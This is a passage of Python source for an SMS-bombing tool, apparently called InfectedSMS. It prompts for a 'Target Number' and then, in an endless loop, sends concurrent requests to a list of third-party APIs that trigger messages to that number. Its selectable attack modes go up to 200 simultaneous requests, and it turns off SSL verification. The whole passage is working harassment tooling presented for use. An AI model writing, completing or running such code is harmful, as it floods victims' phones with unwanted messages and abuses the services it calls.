        phone_val = phone_data.get(phone_format, phone_data['cleaned'])
        url = url_template.replace("{phone}", phone_val)
        
        headers = self.get_headers()
        body = self.format_body(body_template, phone_val, phone_data)
        
        try:
            timeout = aiohttp.ClientTimeout(total=8, connect=5)
            if method == "GET":
                async with session.get(url, headers=headers, ssl=False, timeout=timeout) as resp:
                    return resp.status in [200, 201, 202, 204]
            else:
                if body and body.strip().startswith('{'):
                    async with session.post(url, headers=headers, json=json.loads(body), ssl=False, timeout=timeout) as resp:
                        return resp.status in [200, 201, 202, 204]
                else:
                    async with session.post(url, headers=headers, data=body, ssl=False, timeout=timeout) as resp:
                        return resp.status in [200, 201, 202, 204]
        except asyncio.TimeoutError:
            return False
        except Exception as e:
            return False
    
    async def attack_cycle(self, phone_data: dict, mode_config: dict):
        connector = aiohttp.TCPConnector(limit=mode_config['concurrency'], ssl=False, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.send_request(session, api, phone_data) for api in APIConfigs.APIS]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    self.stats.add_result(False)
                else:
                    self.stats.add_result(result)
            
            sys.stdout.write(f"\r{self.show_live_stats()}")
            sys.stdout.flush()
            
            delay = random.uniform(mode_config['delay'][0], mode_config['delay'][1])
            await asyncio.sleep(delay)
    
    async def start(self, phone: str, mode: str):
        phone_data = PhoneFormatter.format(phone)
        mode_config = Config.MODES[mode]
        
        self.stats.reset()
        self.running = True
        self.paused = False
        
        print(f"\n{Config.Colors.CYAN}{'='*60}{Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}{Config.Colors.BOLD}🎯 TARGET: {phone_data['with_0']}{Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}{Config.Colors.BOLD}⚡ MODE: {mode_config['name']}{Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}{Config.Colors.BOLD}🔥 CONCURRENCY: {mode_config['concurrency']}{Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}{Config.Colors.BOLD}📡 TOTAL APIS: {len(APIConfigs.APIS)}{Config.Colors.RESET}")
        print(f"{Config.Colors.CYAN}{'='*60}{Config.Colors.RESET}")
        print(f"\n{Config.Colors.YELLOW}[!] Press CTRL+C to stop | CTRL+Z to pause{Config.Colors.RESET}\n")
        
        cycle = 0
        while self.running:
            while self.paused:
                await asyncio.sleep(1)
            if not self.running:
                break
            cycle += 1
            self.current_task = asyncio.create_task(self.attack_cycle(phone_data, mode_config))
            await self.current_task
    
    def run(self):
        self.setup_handlers()
        Banner.show()
        
        # Mode selection
        print(f"\n{Config.Colors.CYAN}{'='*50}{Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}{Config.Colors.BOLD}🔥 SELECT ATTACK MODE:{Config.Colors.RESET}")
        print(f"{Config.Colors.BLUE}[1] 👻 STEALTH - Low & Slow (10 concurrent){Config.Colors.RESET}")
        print(f"{Config.Colors.GREEN}[2] ⚡ NORMAL - Balanced (25 concurrent){Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}[3] 🔥 AGGRESSIVE - Fast (60 concurrent){Config.Colors.RESET}")
        print(f"{Config.Colors.RED}[4] 💀 ULTIMATE - Max Power (120 concurrent){Config.Colors.RESET}")
        print(f"{Config.Colors.MAGENTA}[5] ☢️ NUCLEAR - Insane (200 concurrent){Config.Colors.RESET}")
        print(f"{Config.Colors.CYAN}{'='*50}{Config.Colors.RESET}")
        
        while True:
            choice = input(f"\n{Config.Colors.CYAN}[?] Choose (1-5): {Config.Colors.RESET}").strip()
            if choice == '1':
                mode = 'stealth'
                break
            elif choice == '2':
                mode = 'normal'
                break
            elif choice == '3':
                mode = 'aggressive'
                break
            elif choice == '4':
                mode = 'ultimate'
                break
            elif choice == '5':
                mode = 'nuclear'
                break
            else:
                print(f"{Config.Colors.RED}[!] Invalid!{Config.Colors.RESET}")
        
        # Target input
        while True:
            phone = input(f"\n{Config.Colors.CYAN}[?] Target Number: {Config.Colors.RESET}").strip()
            if phone and len(phone) >= 10:
                break
            print(f"{Config.Colors.RED}[!] Invalid number!{Config.Colors.RESET}")
        
        try:
            asyncio.run(self.start(phone, mode))
        except KeyboardInterrupt:
            pass
        except RuntimeError as e:
            if "Event loop is closed" in str(e):
                print(f"{Config.Colors.YELLOW}[!] Restarting event loop...{Config.Colors.RESET}")
                asyncio.set_event_loop(asyncio.new_event_loop())
                asyncio.run(self.start(phone, mode))
        finally:
            self.show_final_stats()

# ============== MAIN ==============
if __name__ == "__main__":
    bomber = InfectedSMS()
    bomber.run()
